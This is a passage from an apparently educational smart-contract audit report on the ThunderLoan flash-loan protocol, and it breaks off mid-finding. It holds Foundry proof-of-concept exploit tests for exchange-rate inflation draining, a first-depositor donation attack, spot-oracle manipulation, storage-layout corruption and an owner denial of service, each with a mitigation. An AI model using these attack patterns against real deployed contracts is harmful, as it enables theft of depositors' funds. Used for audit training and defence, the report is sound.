The `deposit` function contains a critical flaw in its handling of fees and exchange rate updates. It calculates a 'fee' based on the deposited amount using `getCalculatedFee`, which returns a WETH-denominated value. This value is then passed to `AssetToken.updateExchangeRate`, which incorrectly interprets it as an amount of asset tokens. The formula `newExchangeRate = (s_exchangeRate * (totalSupply() + fee)) / totalSupply()` uses this value to artificially inflate the exchange rate without any corresponding increase in the underlying asset backing. This allows any depositor to create unbacked value for all asset token holders, including themselves. A malicious user can exploit this repeatedly to drain the pool's assets over time, as the value of the asset tokens becomes increasingly detached from the actual collateral held.

## Impact
Because `deposit()` forwards a WETH-denominated fee to `AssetToken.updateExchangeRate`, each call increases the exchange-rate by roughly `flashLoanFee` · price / totalSupply. The depositor receives AssetTokens _before_ the rate change, so when she immediately redeems she obtains the deposit plus the newly-minted value. The same collateral can be reused inside the same transaction (`deposit -> redeem -> deposit …`) so the attacker’s required upfront capital is bounded by the chosen loop deposit, while the cumulative profit is bounded only by gas. Repeating the loop until gas limits are hit (or over several transactions) allows a motivated attacker to drain essentially all underlying liquidity from the pool.

## Proof of Concept
1. An honest LP deposits 1,000 DAI. The pool now holds 1,000 DAI and has issued asset tokens. The exchange rate is ~1:1.
2. An attacker deposits 100 DAI. The `deposit` function calculates a fee based on this amount and calls `updateExchangeRate`.
3. `updateExchangeRate` incorrectly adds this 'fee' value to the `totalSupply` in its calculation, artificially inflating the exchange rate for all asset tokens.
4. The attacker now holds asset tokens that are worth more than the DAI they deposited, due to the instant, unbacked yield.
5. The attacker calls `redeem` to withdraw their funds at the inflated rate, realizing a profit and stealing a small amount of the original LP's funds.
6. This can be repeated until the pool is empty.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {AssetToken}          from "src/protocol/AssetToken.sol";
import {OwnableUpgradeable}  from "openzeppelin-upgradeable/contracts/access/OwnableUpgradeable.sol";
import {ERC20}              from "openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IPoolFactory}       from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool}         from "src/interfaces/ITSwapPool.sol";

// ─────────────────── Mock contracts ───────────────────
contract MockERC20 is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockTSwapPool is ITSwapPool {
    uint256 internal price = 1e18; // 1 token == 1 WETH
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) { return price; }
    function setPrice(uint256 p) external { price = p; }
}

contract MockPoolFactory is IPoolFactory {
    mapping(address => address) public pool;
    function setPool(address token, address p) external { pool[token] = p; }
    function getPool(address token) external view returns (address) { return pool[token]; }
}

// ─────────────────── Exploit test ───────────────────
contract DepositInflationTest is Test {
    ThunderLoanUpgraded internal tl;
    MockERC20          internal weth;
    AssetToken         internal aWETH;
    address            internal attacker = address(0xBEEF);

    function setUp() public {
        // deploy mocks
        MockPoolFactory factory = new MockPoolFactory();
        MockTSwapPool   pool    = new MockTSwapPool();
        weth                     = new MockERC20("WETH", "WETH");
        factory.setPool(address(weth), address(pool));

        // deploy ThunderLoan
        tl = new ThunderLoanUpgraded();
        tl.initialize(address(factory));
        tl.setAllowedToken(weth, true);

        aWETH = AssetToken(tl.getAssetFromToken(weth));

        // fund attacker & pool
        weth.mint(address(attacker), 1_000 ether);
        weth.mint(address(this   ), 1_000 ether); // seed pool with honest LP
        weth.approve(address(tl), type(uint256).max);
        tl.deposit(weth, 1_000 ether);            // honest liquidity
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // attacker initial balance
        uint256 start = weth.balanceOf(attacker);
        weth.approve(address(tl), type(uint256).max);

        // single deposit-redeem round-trip
        tl.deposit(weth, 500 ether);
        uint256 aBal = aWETH.balanceOf(attacker);
        tl.redeem(weth, aBal);

        uint256 profitOneRound = weth.balanceOf(attacker) - start;
        assertGt(profitOneRound, 0, "profit should be > 0");

        // repeat 10 more times to show compounding extraction
        for (uint i; i < 10; ++i) {
            tl.deposit(weth, 500 ether);
            aBal = aWETH.balanceOf(attacker);
            tl.redeem(weth, aBal);
        }

        uint256 totalProfit = weth.balanceOf(attacker) - start;
        emit log_named_uint("Total profit (after 11 loops)", totalProfit);
        assertGt(totalProfit, 1 ether, "should have drained > 1 WETH from pool");
        vm.stopPrank();
    }
}


## Suggested Mitigation
Do not adjust the exchange rate during a liquidity deposit. In `deposit()` simply mint AssetTokens at the current `s_exchangeRate` and transfer the underlying. Remove the two lines

    uint256 calculatedFee = getCalculatedFee(token, amount);
    assetToken.updateExchangeRate(calculatedFee);

If the protocol intends to charge a deposit fee, convert it to **AssetToken units** first and transfer the fee directly to the pool instead of manipulating `s_exchangeRate`.

## [H-8]. Integer Overflow/Math issue in ThunderLoan::deposit

## Description
The protocol is vulnerable to a first depositor/precision attack that can lead to theft of funds from subsequent depositors. The `amountToMint` of asset tokens is calculated based on a stored `exchangeRate`. An attacker can become the first depositor with a minimal amount (e.g., 1 wei), resulting in a `totalSupply` of 1 for the `AssetToken`. Then, by engineering a large fee through a flash loan, they can drastically inflate the `exchangeRate`. When a victim subsequently deposits, their calculated `amountToMint` will be rounded down to zero due to this manipulated exchange rate. The victim loses their entire deposit to the pool, which is now effectively controlled by the attacker who holds (almost) 100% of the asset tokens.

## Impact
A malicious first depositor can steal the full deposits of subsequent users, leading to a direct loss of funds. This undermines the core functionality of the liquidity pool and can lead to a complete loss of trust and capital in the affected asset pool.

## Proof of Concept
1. Attacker becomes the first LP by depositing 1 wei.
2. Attacker *donates* a huge amount of the underlying token directly to the AssetToken contract (does **not** call deposit, therefore does not mint additional shares).
3. Attacker performs a flash-loan for the donated liquidity. The fee is accounted against a totalSupply of 1, so `updateExchangeRate` inflates the rate enormously.
4. Honest user deposits a normal amount; `amountToMint = amount * 1e18 / newRate` underflows to 0, so user receives 0 AssetTokens while his underlying is transferred to the pool.
5. All later liquidity is therefore captured by the attacker who owns (nearly) 100 % of AssetTokens.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPoolFactory} from "src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "src/interfaces/ITSwapPool.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";

contract MockERC20 {
    string public name; string public symbol; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    constructor(string memory _n,string memory _s){name=_n;symbol=_s;}
    function _mint(address to,uint256 amt) internal{balanceOf[to]+=amt;totalSupply+=amt;}
    function transfer(address to,uint256 amt) external returns(bool){balanceOf[msg.sender]-=amt;balanceOf[to]+=amt;return true;}
    function approve(address s,uint256 a) external returns(bool){allowance[msg.sender][s]=a;return true;}
    function transferFrom(address f,address t,uint256 a) external returns(bool){allowance[f][msg.sender]-=a;balanceOf[f]-=a;balanceOf[t]+=a;return true;}
}

contract MockPool is ITSwapPool { function getPriceOfOnePoolTokenInWeth() external pure returns(uint256){ return 1e18; } }
contract MockPoolFactory is IPoolFactory { mapping(address=>address) public pools; function getPool(address t) external view returns(address){return pools[t];} function setPool(address t,address p) external {pools[t]=p;} }
contract SimpleReceiver is IFlashLoanReceiver { function executeOperation(address tok,uint256 amt,uint256 fee,address,bytes calldata) external returns(bool){ IERC20(tok).approve(msg.sender, amt+fee); return true; } }

contract FirstDepositorAttack is Test {
    ThunderLoan loan; MockERC20 weth; MockPoolFactory pf; address attacker=address(0xA); address victim=address(0xB);

    function setUp() public {
        loan = new ThunderLoan();
        weth = new MockERC20("WETH","WETH");
        pf = new MockPoolFactory();
        pf.setPool(address(weth), address(new MockPool()));
        loan.initialize(address(pf)); // only poolFactory param required
        loan.setAllowedToken(IERC20(address(weth)), true);
        // fund participants
        weth._mint(attacker, 2_000_000 ether);
        weth._mint(victim,   10 ether);
    }

    function test_firstDepositorPrecisionAttack() public {
        vm.startPrank(attacker);
        weth.approve(address(loan), type(uint256).max);
        // step 1: become first LP with 1 wei
        loan.deposit(IERC20(address(weth)), 1);
        AssetToken aToken = loan.getAssetFromToken(IERC20(address(weth)));
        assertEq(aToken.totalSupply(), 1);
        // step 2: donate large liquidity to aToken so that flash-loan is possible
        uint256 donated = 1_000_000 ether;
        weth.transfer(address(aToken), donated);
        // step 3: flash-loan full donated amount to inflate exchange rate
        SimpleReceiver recv = new SimpleReceiver();
        loan.flashloan(address(recv), IERC20(address(weth)), donated, "");
        uint256 inflated = aToken.getExchangeRate();
        assertGt(inflated, 1e30);
        vm.stopPrank();

        // step 4: victim deposits and receives 0 shares
        vm.startPrank(victim);
        weth.approve(address(loan), 10 ether);
        loan.deposit(IERC20(address(weth)), 10 ether);
        assertEq(aToken.balanceOf(victim), 0);        // zero shares minted
        assertEq(weth.balanceOf(victim), 0);          // underlying taken
        vm.stopPrank();
    }
}

## Suggested Mitigation
To mitigate this, the protocol should ensure that the initial total supply of asset tokens cannot be trivially small. A common solution, used by Uniswap V2, is to mint and burn a minimum number of LP tokens on the first deposit, establishing a permanent, non-zero floor for the total supply. This makes the exchange rate much harder to manipulate.

```solidity
// In ThunderLoan.sol

// Add a constant for minimum liquidity
uint256 private constant MINIMUM_LIQUIDITY = 1000;

function deposit(IERC20 token, uint256 amount) external {
    if (amount == 0) {
        revert ZeroAmount();
    }
    AssetToken assetToken = s_tokenToAssetToken[token];
    if (address(assetToken) == address(0)) {
        revert TokenNotAllowed();
    }

    if (assetToken.totalSupply() == 0) {
        // Burn initial liquidity to make manipulation expensive
        assetToken.mint(address(0), MINIMUM_LIQUIDITY);
    }

    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 amountToMint = (amount * AssetToken(assetToken).EXCHANGE_RATE_PRECISION()) / exchangeRate;
    if (amountToMint == 0) {
        revert ZeroSharesMinted();
    }
    assetToken.mint(msg.sender, amountToMint);
    SafeERC20.safeTransferFrom(token, msg.sender, address(assetToken), amount);
    emit Deposited(msg.sender, token, amount, amountToMint);
}
```
Additionally, consider adopting a shares calculation based on the pool's total asset balance rather than a stored exchange rate, similar to the EIP-4626 standard, which is more robust against donation-based attacks.

## [H-9]. Storage Layout issue in ThunderLoanUpgraded::NA

## Description
The contract's upgrade path from `ThunderLoan` to `ThunderLoanUpgraded` is broken due to a storage layout mismatch. The `ThunderLoanUpgraded` contract removes the `s_feePrecision` state variable, which was present in `ThunderLoan`, and replaces it with a constant. This causes all subsequent state variables to shift their storage slots, leading to state corruption upon upgrade. For example, the `s_flashLoanFee` variable in the upgraded contract will occupy the slot of the old `s_feePrecision` variable, causing the flash loan fee to be misinterpreted as `1e18` (100%).

Vulnerable Code (`ThunderLoan.sol` vs `ThunderLoanUpgraded.sol`):
```solidity
// ThunderLoan.sol
contract ThunderLoan is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable {
    //...
    mapping(IERC20 => bool) public isAllowedToken;
    uint256 public s_feePrecision; // Slot X
    uint256 public s_flashLoanFee; // Slot X+1
    mapping(IERC20 => bool) public s_currentlyFlashLoaning; // Slot X+2
    //...
}

// ThunderLoanUpgraded.sol
contract ThunderLoanUpgraded is Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable {
    //...
    mapping(IERC20 => bool) public isAllowedToken;
    uint256 public constant FEE_PRECISION = 1e18; // No longer a storage variable
    uint256 public s_flashLoanFee; // Slot X (Now reads from old s_feePrecision slot)
    mapping(IERC20 => bool) public s_currentlyFlashLoaning; // Slot X+1 (Now reads from old s_flashLoanFee slot)
    //...
}
```

## Impact
Upgrading the contract will lead to critical state corruption. The flash loan fee will be incorrectly set to 100%, and the `s_currentlyFlashLoaning` mapping will be overwritten with the old fee value, breaking the re-entrancy protection mechanism and likely causing all flash loans to fail. This renders the protocol unusable and can lead to loss of funds if the corrupted state is misinterpreted by other functions or external callers.

## Proof of Concept
1. Deploy ThunderLoan implementation (V1).
2. Deploy ERC1967Proxy with V1 and call initialize("0x00") during construction.
3. Read getFee()  -> 3 × 10¹⁵  (0.3 %)
   Read getFeePrecision() -> 1 × 10¹⁸.
4. Deploy ThunderLoanUpgraded implementation (V2).
5. From the proxy owner call upgradeToAndCall(address(V2), "").
6. Read getFee() again through the proxy – it now returns 1 × 10¹⁸ (was stored in the previous slot of s_feePrecision). Storage is corrupted and flash-loan fee is interpreted as 100 %.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract StorageLayoutTest is Test {
    ThunderLoan internal proxyV1;
    address internal proxyAddress;

    function setUp() public {
        // Deploy V1 implementation
        ThunderLoan implV1 = new ThunderLoan();

        // Prepare initializer calldata (initialize(address poolFactory))
        bytes memory initData = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(0));

        // Deploy proxy and initialize in the same tx
        ERC1967Proxy proxy = new ERC1967Proxy(address(implV1), initData);
        proxyAddress = address(proxy);
        proxyV1 = ThunderLoan(payable(proxyAddress));
    }

    function test_StorageLayoutCorruptionOnUpgrade() public {
        // Sanity check V1 state
        uint256 initialFee       = proxyV1.getFee();            // 0.3 %  -> 3e15
        uint256 initialPrecision = proxyV1.getFeePrecision();   // 1e18
        assertEq(initialFee, 3e15);
        assertEq(initialPrecision, 1e18);

        // Deploy V2 implementation
        ThunderLoanUpgraded implV2 = new ThunderLoanUpgraded();

        // Perform UUPS upgrade (caller is proxy owner)
        proxyV1.upgradeToAndCall(address(implV2), "");

        // Interact with the same proxy via the new ABI
        ThunderLoanUpgraded proxyV2 = ThunderLoanUpgraded(payable(proxyAddress));
        uint256 feeAfterUpgrade = proxyV2.getFee();

        console.log("Fee before upgrade:", initialFee);
        console.log("Fee after  upgrade:", feeAfterUpgrade);

        // The fee has become 1e18 (100 %) instead of 0.3 %
        assertEq(feeAfterUpgrade, initialPrecision, "fee is now corrupted");
        assertNotEq(feeAfterUpgrade, initialFee, "fee changed");
    }
}

## Suggested Mitigation
To prevent storage layout corruption, never remove or reorder state variables in an upgradeable contract. If a variable is no longer needed, it should be deprecated but kept in place. Alternatively, if removal is absolutely necessary, ensure it is the last variable in the storage layout and that no new variables are added in its place in a way that shifts subsequent slots. For future-proofing, add a `__gap` array at the end of the contract's state variables to reserve space for future additions.

```solidity
// In ThunderLoan.sol and subsequent versions
contract ThunderLoan is ... {
    // ... existing state variables ...
    
    // Reserve storage slots for future upgrades
    uint256[50] private __gap;
}
```
To fix the existing issue, the `s_feePrecision` variable should be kept in `ThunderLoanUpgraded` as a state variable, even if it's deprecated and unused, to maintain the storage layout.

## [H-10]. DOS issue in ThunderLoan::redeem

## Description
The `redeem` function checks if a token is allowed using the `isAllowedToken` mapping. However, this check is also applied to withdrawals, not just deposits. The owner can call `setAllowedToken(token, false)` at any time. If this is done for a token that has existing liquidity provided by users, those users will be unable to withdraw their funds via `redeem`, as the call will revert. This effectively allows the owner to trap user funds indefinitely.

Vulnerable Code (`ThunderLoan.sol`):
```solidity
function redeem(IERC20 token, uint256 amountOfAssetToken) external {
    // ... checks ...
    require(isAllowedToken[token], "ThunderLoan: Token not allowed"); // VULNERABILITY
    AssetToken assetToken = getAssetFromToken(token);
    uint256 amountToRedeem = (amountOfAssetToken * assetToken.getExchangeRate()) / EXCHANGE_RATE_PRECISION;
    assetToken.burn(msg.sender, amountOfAssetToken);
    assetToken.transferUnderlyingTo(msg.sender, amountToRedeem);
    emit Redeemed(msg.sender, address(token), amountToRedeem);
}
```

## Impact
This vulnerability allows a malicious or compromised owner to perform a denial-of-service attack on liquidity providers, preventing them from accessing their deposited funds. This can lead to a permanent loss of funds for users if the owner never re-enables the token. It breaks the fundamental trust assumption that LPs can withdraw their assets at will.

## Proof of Concept
1. Owner initialises ThunderLoan through an ERC1967 proxy and whitelists DAI.
2. Alice deposits 10 000 DAI and receives aDAI.
3. Owner setsAllowedToken(DAI,false).
4. Alice’s call to redeem() now reverts with ThunderLoan__TokenNotAllowed, permanently locking her funds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {ERC20Mock} from "openzeppelin-contracts/mocks/token/ERC20Mock.sol";
import {AssetToken} from "src/protocol/AssetToken.sol";

contract ThunderLoanDosTest is Test {
    ThunderLoan private implementation;
    ThunderLoan private thunderLoan; // proxy view
    ERC20Mock private dai;
    address private alice;

    function setUp() public {
        implementation = new ThunderLoan();

        bytes memory init = abi.encodeWithSelector(
            ThunderLoan.initialize.selector,
            address(0)              // poolFactory not relevant for this test
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), init);
        thunderLoan = ThunderLoan(address(proxy));

        alice = makeAddr("alice");
        dai = new ERC20Mock("Dai Stablecoin", "DAI", alice, 10_000e18);

        // owner enables DAI deposits
        thunderLoan.setAllowedToken(dai, true);

        // Alice deposits 10 000 DAI
        vm.startPrank(alice);
        dai.approve(address(thunderLoan), 10_000e18);
        thunderLoan.deposit(dai, 10_000e18);
        vm.stopPrank();
    }

    function testRedeemBlockedAfterDisallow() public {
        // Owner disables the token
        thunderLoan.setAllowedToken(dai, false);

        AssetToken aDai = thunderLoan.getAssetFromToken(dai);

        vm.startPrank(alice);
        uint256 aBal = aDai.balanceOf(alice);

        // Redeem should revert and funds stay locked
        vm.expectRevert();
        thunderLoan.redeem(dai, aBal);
        vm.stopPrank();
    }
}

## Suggested Mitigation
The `isAllowedToken` check should be removed from the `redeem` function. This check is appropriate for `deposit` to prevent new funds from entering for a deprecated asset, but it should not block withdrawals. LPs must always be able to retrieve their share of the underlying assets, regardless of the token's current status.

```solidity
// src/protocol/ThunderLoan.sol

function redeem(IERC20 token, uint256 amountOfAssetToken) external {
    if (amountOfAssetToken == 0) {
        revert ThunderLoan__ZeroAmount();
    }
    if (s_currentlyFlashLoaning[token]) {
        revert ThunderLoan__FlashLoaning();
    }
    // require(isAllowedToken[token], "ThunderLoan: Token not allowed"); // FIX: Remove this line
    AssetToken assetToken = getAssetFromToken(token);
    uint256 amountToRedeem = (amountOfAssetToken * assetToken.getExchangeRate()) / EXCHANGE_RATE_PRECISION;
    assetToken.burn(msg.sender, amountOfAssetToken);
    assetToken.transferUnderlyingTo(msg.sender, amountToRedeem);
    emit Redeemed(msg.sender, address(token), amountToRedeem);
}
```

## [H-11]. Flash Loan Economic Manipulation issue in ThunderLoanUpgraded::getCalculatedFee(IERC20,uint256)

## Description
The `ThunderLoanUpgraded` contract determines the flash loan fee based on a price fetched from an on-chain oracle. Specifically, in `getCalculatedFee`, if `getPrice(token)` returns a value less than 0.1 WETH, the fee is set to zero. The underlying oracle appears to provide a spot price, which is highly susceptible to manipulation within a single transaction. An attacker can take a large flash loan from another protocol (e.g., Aave, Uniswap), use it to manipulate the price on the TSwap pool that `getPrice` queries, take a fee-free flash loan from ThunderLoan, and then repay the initial flash loan, all within one atomic transaction.

## Impact
The protocol can be tricked into issuing flash loans with zero fees. This completely undermines the protocol's revenue model, as all fees that should be earned by liquidity providers can be stolen by an attacker. This would destroy the incentive for anyone to provide liquidity, likely leading to the collapse of the protocol.

## Proof of Concept
1. The attacker identifies a token pool in ThunderLoan (e.g., LINK).
2. The attacker takes a large flash loan of LINK from another protocol like Aave.
3. The attacker swaps the borrowed LINK for WETH on the TSwap pool that the ThunderLoan oracle uses. This action crashes the spot price of LINK in WETH terms to below the 0.1 WETH threshold.
4. The attacker then calls `flashloan` on `ThunderLoanUpgraded` for the LINK token. The `getCalculatedFee` function queries the manipulated oracle, gets a price < 0.1 WETH, and returns a fee of 0.
5. The attacker receives the flash loan from ThunderLoan for free. In their `executeOperation` callback, they can use these funds and then reverse the swap from step 3 to repay the initial Aave flash loan.
6. The attacker has successfully used a valuable protocol feature for free, denying yield to LPs.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IPoolFactory} from "../src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "../src/interfaces/ITSwapPool.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract MockPool is ITSwapPool {
    uint256 public price;

    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
        return price;
    }

    function setPrice(uint256 _price) external {
        price = _price;
    }
}

contract MockFactory is IPoolFactory {
    address public pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function getPool(address) external view returns (address) {
        return pool;
    }
}

contract FeeCheckReceiver is IFlashLoanReceiver {
    function executeOperation(address, uint256, uint256 fee, address, bytes calldata) external pure returns (bool) {
        require(fee == 0, "Fee was not zero!");
        return true;
    }
}

contract OracleManipulationTest is Test {
    ThunderLoanUpgraded internal loan;
    ERC20Mock internal token;
    MockPool internal pool;
    MockFactory internal factory;
    address internal owner = makeAddr("owner");

    function setUp() public {
        pool = new MockPool();
        factory = new MockFactory(address(pool));
        token = new ERC20Mock();

        vm.startPrank(owner);
        ThunderLoanUpgraded impl = new ThunderLoanUpgraded();
        // Can't use proxy due to storage collision, testing logic directly on impl
        loan = impl;
        loan.initialize(address(factory));
        loan.setAllowedToken(token, true);
        token.mint(address(loan), 1_000_000 ether);
        vm.stopPrank();
    }

    function test_ManipulateOracle_GetFreeFlashloan() public {
        // Normal operation: price is high, fee is charged
        pool.setPrice(1 ether); // 1 WETH
        uint256 fee = loan.getCalculatedFee(token, 1000 ether);
        assertTrue(fee > 0, "Fee should be positive with high price");

        // Attack: Manipulate oracle to report a low price
        pool.setPrice(1e16); // 0.01 WETH, which is < 0.1 WETH
        uint256 manipulatedFee = loan.getCalculatedFee(token, 1000 ether);
        assertEq(manipulatedFee, 0, "Fee should be zero with manipulated low price");

        // Execute the flashloan and have the receiver verify the fee is 0
        FeeCheckReceiver receiver = new FeeCheckReceiver();
        loan.flashloan(address(receiver), token, 1000 ether, "");

        console.log("Attack successful: Oracle manipulated to receive a fee-free flash loan.");
    }
}
```

## Suggested Mitigation
The protocol should not rely on a manipulatable spot price oracle for critical security logic like fee calculation. A manipulation-resistant oracle, such as a Time-Weighted Average Price (TWAP) oracle (e.g., from Uniswap V3) or a reputable oracle network like Chainlink, should be used. Additionally, sanity checks should be added, such as ensuring the returned price is within a reasonable range and not zero.



# Medium Risk Findings

## [M-1]. DOS issue in ThunderLoan::repay

## Description
The `repay` function in the `ThunderLoan` contract contains a logic error that makes the core flash loan functionality unusable. The function includes the check `require(!s_currentlyFlashLoaning[token], "ThunderLoan__NotCurrentlyFlashLoaning");`. This check is inverted. The `repay` function is intended to be called by a flash loan borrower from within the `executeOperation` callback, at which point `s_currentlyFlashLoaning[token]` is set to `true`. Because the condition requires the flag to be `false`, the `repay` call will always revert, causing the entire flash loan transaction to fail.

## Impact
The bug makes every flash-loan unrepayable, reverting all flash-loan attempts and blocking fee generation. No funds are stolen or locked, but the core product of the protocol becomes unusable until the contract is upgraded.

## Proof of Concept
1. Owner whitelists WETH and a LP deposits liquidity.
2. Borrower calls flashloan().  Inside flashloan() the contract sets s_currentlyFlashLoaning[WETH] = true and hands the funds to the borrower.
3. When the borrower tries to repay via ThunderLoan.repay(), the call hits `require(!s_currentlyFlashLoaning[token])`, which is now false ⇒ revert.
4. The whole transaction reverts, demonstrating that no flash loan can succeed while the bug exists.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
import {OracleUpgradeable} from "../../src/protocol/OracleUpgradeable.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {AssetToken} from "../../src/protocol/AssetToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

// ───────────────────────────────────────────────────────────────────────────────
// very small mock TSwap infra
contract MockTSwapPool { function getPriceOfOnePoolTokenInWeth() external pure returns (uint256) { return 1e18; } }
contract MockPoolFactory { MockTSwapPool public pool = new MockTSwapPool(); function getPool(address) external view returns (address) { return address(pool); } }
// ───────────────────────────────────────────────────────────────────────────────

contract RepayBugTest is Test, IFlashLoanReceiver {
    ThunderLoan internal loan;
    ERC20Mock  internal weth;
    address    internal lp = address(0xBEEF);

    function setUp() public {
        // deploy token
        weth = new ERC20Mock("WETH","WETH", address(this), 0);
        // deploy implementation & proxy
        ThunderLoan impl = new ThunderLoan();
        MockPoolFactory factory = new MockPoolFactory();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory))
        );
        loan = ThunderLoan(address(proxy)); // the test contract owns the proxy

        // whitelist token
        loan.setAllowedToken(weth, true);

        // add LP liquidity so that flash-loan is possible
        weth.mint(lp, 1_000 ether);
        vm.startPrank(lp);
        weth.approve(address(loan), type(uint256).max);
        loan.deposit(weth, 1_000 ether);
        vm.stopPrank();
    }

    // ───────────────────────────────────────────────────────────────────────────
    // the actual test ----------------------------------------------------------
    function test_FlashLoanAlwaysRevertsDueToRepayBug() public {
        // borrower also needs some ETH for the fee (not important for revert)
        weth.mint(address(this), 1 ether);

        vm.expectRevert(ThunderLoan.ThunderLoan__NotCurrentlyFlashLoaning.selector);
        loan.flashloan(address(this), weth, 100 ether, "");
    }

    // ───────────────────────────────────────────────────────────────────────────
    // IFlashLoanReceiver -------------------------------------------------------
    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        // the following line triggers the buggy require and reverts
        ERC20Mock(token).approve(address(loan), amount + fee);
        loan.repay(ERC20Mock(token), amount + fee);
        return true;
    }
}


## Suggested Mitigation
Inside ThunderLoan.repay() change `require(!s_currentlyFlashLoaning[token], …)` to `require(s_currentlyFlashLoaning[token], …)` so repayment is only allowed while a flash-loan is active. Optionally store the expected receiver address during flash-loan initiation and require `msg.sender` to be that receiver when calling repay().

## [M-2]. Storage Layout issue in ThunderLoanUpgraded::NA

## Description
The `ThunderLoanUpgraded` contract, intended as an upgrade for `ThunderLoan`, introduces a breaking change in storage layout. It removes the `s_feePrecision` state variable. Since state variables are stored in order, removing one causes all subsequent variables to shift their storage slots. Specifically, `s_flashLoanFee` in `ThunderLoanUpgraded` will occupy the slot previously used by `s_feePrecision`, and `s_currentlyFlashLoaning` will occupy the slot of `s_flashLoanFee`. Upon upgrade, `s_flashLoanFee` will be incorrectly read as the value of `s_feePrecision` (1e18, or 100%), making flash loans prohibitively expensive and effectively bricking the protocol.

## Impact
After the upgrade, the flash-loan fee is read as 1e18 (100 %) because the slot previously holding `s_feePrecision` is now interpreted as `s_flashLoanFee`. Consequently every flash-loan call reverts at the `fee < startingBalance + fee` check, effectively making the flash-loan functionality unusable and all revenue dependent on it drop to zero. Deposit and redeem flows remain functional, so user funds are not lost, but the core product is bricked and protocol revenue ceases.

## Proof of Concept
1. Deploy the `ThunderLoan` contract behind an ERC1967Proxy.
2. Initialize the contract. The flash loan fee is 0.3% (`3e15`).
3. Deploy the `ThunderLoanUpgraded` contract.
4. As the owner, call `upgradeTo` on the proxy, pointing to the new `ThunderLoanUpgraded` implementation.
5. Call the `getFee()` function on the proxy.
6. The function will return `1e18` (the value of `s_feePrecision` from the old implementation) instead of `3e15`.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract MockTSwapPool_Storage {
    function getPriceOfOnePoolTokenInWeth() external pure returns (uint256) { return 1e18; }
}
contract MockPoolFactory_Storage {
    MockTSwapPool_Storage public pool = new MockTSwapPool_Storage();
    function getPool(address) external view returns (address) { return address(pool); }
}

contract StorageLayoutTest is Test {
    ThunderLoan internal thunderLoanProxy;
    address internal owner = makeAddr("owner");

    function setUp() public {
        ThunderLoan implementationV1 = new ThunderLoan();
        MockPoolFactory_Storage factory = new MockPoolFactory_Storage();
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementationV1), "");
        thunderLoanProxy = ThunderLoan(address(proxy));
        vm.prank(owner);
        thunderLoanProxy.initialize(address(factory));
    }

    function test_upgradeCausesStorageCollision() public {
        // 1. Check initial fee in V1
        uint256 initialFee = thunderLoanProxy.getFee();
        assertEq(initialFee, 3e15, "Initial fee should be 0.3%");

        // 2. Deploy and upgrade to V2
        ThunderLoanUpgraded implementationV2 = new ThunderLoanUpgraded();
        vm.prank(owner);
        thunderLoanProxy.upgradeToAndCall(address(implementationV2), "");

        // 3. Check fee in V2 - it will be corrupted
        uint256 feeAfterUpgrade = thunderLoanProxy.getFee();
        uint256 expectedCorruptedFee = 1e18; // Value of s_feePrecision in V1
        
